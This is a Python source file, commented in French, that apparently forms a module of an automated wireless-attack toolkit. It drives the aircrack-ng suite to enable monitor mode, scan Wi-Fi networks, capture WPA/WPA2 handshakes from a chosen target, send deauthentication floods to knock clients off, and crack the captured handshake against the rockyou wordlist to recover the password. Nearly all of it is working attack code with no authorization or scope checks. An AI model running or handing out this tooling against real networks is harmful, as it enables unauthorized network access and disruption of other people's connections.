#!/usr/bin/env python3
"""
Wireless Expert - RÉELLE Implémentation
Scan WiFi, capture handshake, cracking WPA/WPA2
"""

import asyncio
import re
import os
from typing import Dict, Any, List, Optional
from pathlib import Path


class WirelessExpert:
    """Expert en sécurité des réseaux sans-fil avec commandes RÉELLES"""
    
    def __init__(self, executor):
        self.executor = executor
        self.capture_dir = Path("/tmp/wifi_captures")
        self.capture_dir.mkdir(exist_ok=True)
    
    async def scan_wifi_networks(self, interface: str) -> Dict[str, Any]:
        """
        Scan RÉEL des réseaux WiFi avec iwlist ou airodump-ng
        
        Args:
            interface: Interface réseau (ex: wlan0, wlan0mon)
        
        Returns:
            Dict avec liste des réseaux trouvés
        """
        networks = []
        
        # Méthode 1: iwlist scan (interface normale)
        if not interface.endswith('mon'):
            cmd = f"iwlist {interface} scan"
            stdout, stderr = await self.executor.run_command(cmd, timeout=30)
            
            if "Interface doesn't support scanning" in stderr:
                return {
                    'error': 'Interface ne supporte pas le scanning',
                    'suggestion': f'Utilisez: airmon-ng start {interface}'
                }
            
            if stdout:
                networks = self._parse_iwlist_output(stdout)
        
        # Méthode 2: airodump-ng (interface en mode monitor)
        else:
            # Créer fichier temporaire pour capture
            temp_prefix = str(self.capture_dir / "scan")
            cmd = f"timeout 15 airodump-ng {interface} -w {temp_prefix} --output-format csv"
            
            stdout, _ = await self.executor.run_command(cmd, timeout=20)
            
            # Parser le fichier CSV généré
            csv_file = f"{temp_prefix}-01.csv"
            if os.path.exists(csv_file):
                networks = self._parse_airodump_csv(csv_file)
                # Nettoyer
                os.remove(csv_file)
        
        return {
            'interface': interface,
            'networks_found': len(networks),
            'networks': networks[:20]  # Limiter à 20 pour éviter overflow
        }
    
    def _parse_iwlist_output(self, output: str) -> List[Dict[str, Any]]:
        """Parse la sortie de iwlist scan"""
        networks = []
        current_network = {}
        
        for line in output.split('\n'):
            line = line.strip()
            
            if 'Cell' in line and 'Address:' in line:
                if current_network:
                    networks.append(current_network)
                # Nouveau réseau
                match = re.search(r'Address:\s*([0-9A-Fa-f:]+)', line)
                current_network = {'bssid': match.group(1) if match else 'Unknown'}
            
            elif 'ESSID:' in line:
                match = re.search(r'ESSID:"([^"]*)"', line)
                current_network['essid'] = match.group(1) if match else 'Hidden'
            
            elif 'Channel:' in line:
                match = re.search(r'Channel:(\d+)', line)
                current_network['channel'] = int(match.group(1)) if match else 0
            
            elif 'Quality=' in line:
                match = re.search(r'Signal level=(-?\d+)', line)
                current_network['power'] = int(match.group(1)) if match else -100
            
            elif 'Encryption key:' in line:
                current_network['encryption'] = 'WEP' if 'on' in line else 'Open'
            
            elif 'IE: IEEE 802.11i/WPA2' in line:
                current_network['encryption'] = 'WPA2'
            
            elif 'IE: WPA' in line and current_network.get('encryption') != 'WPA2':
                current_network['encryption'] = 'WPA'
        
        if current_network:
            networks.append(current_network)
        
        return networks
    
    def _parse_airodump_csv(self, csv_file: str) -> List[Dict[str, Any]]:
        """Parse le fichier CSV d'airodump-ng"""
        networks = []
        
        with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
        
        # Trouver la section des AP (Access Points)
        ap_section = False
        for line in lines:
            if 'BSSID' in line and 'PWR' in line:
                ap_section = True
                continue
            
            if ap_section and line.strip():
                parts = [p.strip() for p in line.split(',')]
                if len(parts) >= 14:
                    network = {
                        'bssid': parts[0],
                        'power': int(parts[8]) if parts[8].lstrip('-').isdigit() else -100,
                        'channel': int(parts[3]) if parts[3].isdigit() else 0,
                        'encryption': parts[5],
                        'essid': parts[13] if parts[13] else 'Hidden'
                    }
                    networks.append(network)
        
        return networks
    
    async def capture_handshake(
        self,
        interface: str,
        bssid: str,
        channel: int,
        timeout: int = 120
    ) -> Dict[str, Any]:
        """
        Capture RÉELLE d'un handshake WPA/WPA2
        
        Args:
            interface: Interface en mode monitor
            bssid: BSSID du réseau cible
            channel: Canal du réseau
            timeout: Temps d'attente max (secondes)
        
        Returns:
            Dict avec chemin du fichier de handshake
        """
        if not interface.endswith('mon'):
            return {
                'error': 'Interface doit être en mode monitor',
                'suggestion': f'airmon-ng start {interface.replace("mon", "")}'
            }
        
        capture_file = str(self.capture_dir / f"handshake_{bssid.replace(':', '')}")
        
        # Commande airodump-ng pour capture ciblée
        cmd = (
            f"timeout {timeout} airodump-ng {interface} "
            f"--bssid {bssid} --channel {channel} "
            f"-w {capture_file} --output-format pcap"
        )
        
        # Lancer la capture en arrière-plan
        stdout, stderr = await self.executor.run_command(cmd, timeout=timeout + 5)
        
        # Vérifier si handshake capturé
        cap_file = f"{capture_file}-01.cap"
        if os.path.exists(cap_file):
            # Vérifier avec aircrack-ng si handshake est présent
            check_cmd = f"aircrack-ng {cap_file} | grep 'handshake'"
            check_out, _ = await self.executor.run_command(check_cmd, timeout=10)
            
            if 'handshake' in check_out.lower():
                return {
                    'success': True,
                    'handshake_file': cap_file,
                    'message': 'Handshake capturé avec succès',
                    'next_step': f'Utilisez crack_wpa_handshake("{cap_file}", wordlist)'
                }
            else:
                return {
                    'success': False,
                    'message': 'Capture terminée mais aucun handshake détecté',
                    'suggestion': 'Réessayez ou effectuez une deauth attack'
                }
        
        return {
            'error': 'Fichier de capture non créé',
            'stderr': stderr[:500]
        }
    
    async def deauth_attack(
        self,
        interface: str,
        bssid: str,
        client_mac: Optional[str] = None,
        count: int = 10
    ) -> Dict[str, Any]:
        """
        Attaque de déauthentification RÉELLE
        
        Args:
            interface: Interface en mode monitor
            bssid: BSSID de l'AP cible
            client_mac: MAC du client (None = broadcast)
            count: Nombre de paquets deauth
        
        Returns:
            Dict avec résultat
        """
        if not interface.endswith('mon'):
            return {'error': 'Interface doit être en mode monitor'}
        
        if client_mac:
            cmd = f"aireplay-ng --deauth {count} -a {bssid} -c {client_mac} {interface}"
        else:
            cmd = f"aireplay-ng --deauth {count} -a {bssid} {interface}"
        
        stdout, stderr = await self.executor.run_command(cmd, timeout=30)
        
        return {
            'success': 'Sending DeAuth' in stdout or 'sent' in stdout.lower(),
            'packets_sent': count,
            'target': bssid,
            'message': 'Deauth packets envoyés' if 'sent' in stdout.lower() else 'Échec'
        }
    
    async def crack_wpa_handshake(
        self,
        handshake_file: str,
        wordlist: str = "/usr/share/wordlists/rockyou.txt"
    ) -> Dict[str, Any]:
        """
        Cracking RÉEL de handshake WPA/WPA2 avec aircrack-ng
        
        Args:
            handshake_file: Fichier .cap avec handshake
            wordlist: Wordlist à utiliser
        
        Returns:
            Dict avec résultat du crack
        """
        if not os.path.exists(handshake_file):
            return {'error': 'Fichier de handshake introuvable'}
        
        if not os.path.exists(wordlist):
            return {
                'error': 'Wordlist introuvable',
                'suggestion': 'Utilisez: gunzip /usr/share/wordlists/rockyou.txt.gz'
            }
        
        # Commande aircrack-ng
        cmd = f"aircrack-ng {handshake_file} -w {wordlist}"
        
        # Le cracking peut être long - timeout de 10 minutes
        stdout, stderr = await self.executor.run_command(cmd, timeout=600)
        
        # Parser la sortie pour trouver le mot de passe
        if 'KEY FOUND!' in stdout:
            # Extraire le mot de passe
            match = re.search(r'KEY FOUND! \[ (.+) \]', stdout)
            password = match.group(1) if match else 'Found but not parsed'
            
            return {
                'success': True,
                'password': password,
                'message': f'Mot de passe trouvé: {password}'
            }
        elif 'Passphrase not in dictionary' in stdout:
            return {
                'success': False,
                'message': 'Mot de passe non trouvé dans la wordlist',
                'suggestion': 'Essayez une wordlist plus complète ou un bruteforce'
            }
        else:
            return {
                'success': False,
                'message': 'Cracking en cours ou échec',
                'output': stdout[:500]
            }
    
    async def enable_monitor_mode(self, interface: str) -> Dict[str, Any]:
        """
        Active le mode monitor sur une interface
        
        Args:
            interface: Interface réseau (ex: wlan0)
        
        Returns:
            Dict avec nouvelle interface en mode monitor
        """
        # Tuer les processus conflictuels
        kill_cmd = "airmon-ng check kill"
        await self.executor.run_command(kill_cmd, timeout=10)
        
        # Activer mode monitor
        cmd = f"airmon-ng start {interface}"
        stdout, stderr = await self.executor.run_command(cmd, timeout=15)
        
        # Parser pour trouver le nom de l'interface monitor
        match = re.search(r'monitor mode (?:vif )?enabled on \[?(\w+)\]?', stdout, re.IGNORECASE)
        mon_interface = match.group(1) if match else f"{interface}mon"
        
        return {
            'success': 'enabled' in stdout.lower(),
            'monitor_interface': mon_interface,
            'message': f'Mode monitor activé sur {mon_interface}'
        }
    
    async def disable_monitor_mode(self, interface: str) -> Dict[str, Any]:
        """Désactive le mode monitor"""
        cmd = f"airmon-ng stop {interface}"
        stdout, _ = await self.executor.run_command(cmd, timeout=15)
        
        return {
            'success': 'disabled' in stdout.lower(),
            'message': 'Mode monitor désactivé'
        }


if __name__ == "__main__":
    async def test():
        from ..core.async_executor import AsyncExecutor
        
        executor = AsyncExecutor()
        wireless = WirelessExpert(executor)
        
        print("🔍 Test WirelessExpert")
        print("=" * 60)
        
        # Test 1: Scan WiFi
        print("\n1. Test scan WiFi (wlan0):")
        result = await wireless.scan_wifi_networks("wlan0")
        print(f"Réseaux trouvés: {result.get('networks_found', 0)}")
        
        print("\n✅ Tests terminés")
        executor.close()
    
    asyncio.run(test())